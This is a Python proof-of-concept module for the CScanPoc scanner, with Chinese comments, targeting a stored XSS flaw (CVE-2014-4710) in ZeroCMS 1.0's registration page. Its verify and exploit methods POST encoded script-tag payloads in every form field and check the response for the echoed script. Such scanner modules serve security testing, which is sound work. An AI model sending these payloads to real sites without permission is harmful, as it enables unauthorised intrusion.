# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib,urllib2
import re

class Vuln(ABVuln):
    vuln_id = 'ZeroCMS_0001' # 平台漏洞编号，留空
    name = 'ZeroCMS 1.0 /zero_transact_user.php XSS' # 漏洞名称
    level = VulnLevel.MED # 漏洞危害级别
    type = VulnType.XSS # 漏洞类型
    disclosure_date = '2014-07-27'  # 漏洞公布时间
    desc = '''
        ZeroCMS用户注册页面zero_transact_user.php表单完全没进行过滤。
    ''' # 漏洞描述
    ref = 'https://www.exploit-db.com/exploits/34170/' # 漏洞来源
    cnvd_id = '' # cnvd漏洞编号
    cve_id = 'CVE-2014-4710' #cve编号
    product = 'ZeroCMS'  # 漏洞应用名称
    product_version = '1.0'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '4ee2962e-4c22-4ff1-b5b8-e44847f308f8'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-06' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))      
            verify_url = '{target}'.format(target=self.target)+'/zero_transact_user.php'
            verify_data = 'name=%3Cscript%3Ealert%28123%29%3C%2Fscript%3E&email=%3Cscript%3E'\
                'alert%28123%29%3C%2Fscript%3E&password_1=%3Cscript%3Ealert%28123%29%3C%2Fscript'\
                '%3E&password_2=%3Cscript%3Ealert%28123%29%3C%2Fscript%3E&action=Create+Account'
            request = urllib2.Request(verify_url, data=verify_data)
            response = urllib2.urlopen(request)
            content = response.read()
            if "Duplicate entry '<script>alert(123)</script>' for key 'email'" in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 漏洞利用'.format(
                    target=self.target, vuln=self.vuln))

            verify_url = '{target}'.format(target=self.target)+'/zero_transact_user.php'
            verify_data = 'name=%3Cscript%3Ealert%28123%29%3C%2Fscript%3E&email=%3Cscript%3E'\
                'alert%28123%29%3C%2Fscript%3E&password_1=%3Cscript%3Ealert%28123%29%3C%2Fscript'\
                '%3E&password_2=%3Cscript%3Ealert%28123%29%3C%2Fscript%3E&action=Create+Account'
            request = urllib2.Request(verify_url, data=verify_data)
            response = urllib2.urlopen(request)
            content = response.read()
            if "Duplicate entry '<script>alert(123)</script>' for key 'email'" in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞，获取到漏洞地址为{url}'.format(target=self.target,name=self.vuln.name,url=verify_url))
        
        except Exception, e:
            self.output.info('执行异常{}'.format(e))
        

if __name__ == '__main__':
    Poc().run()
